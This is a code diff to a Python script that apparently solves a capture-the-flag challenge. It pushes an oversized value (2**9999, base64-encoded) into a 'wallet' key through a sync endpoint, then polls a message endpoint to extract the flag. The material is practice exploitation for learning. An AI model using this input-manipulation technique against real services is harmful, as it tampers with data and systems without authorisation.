@@ -1,7 +1,7 @@
 import sys
 from pathlib import Path
 sys.path.append(str(Path(__file__).resolve().parent.parent))
-from utils import get_session
+from utils import get_session, find_flag
 
 import base64
 
@@ -19,12 +19,14 @@ class Solver:
 
     def main(self):
         value = self.get_base64_wallet_value(2 ** 9999)
-        print(value)
 
         self.session.put(
             f"{BASE_URL}/service/sync",
             json={"key": "wallet", "value": value},
         )
+
+        response = self.session.get(f"{BASE_URL}/service/messagePoll")
+        return find_flag(response.text)
 
 if __name__ == "__main__":
     Solver().main()
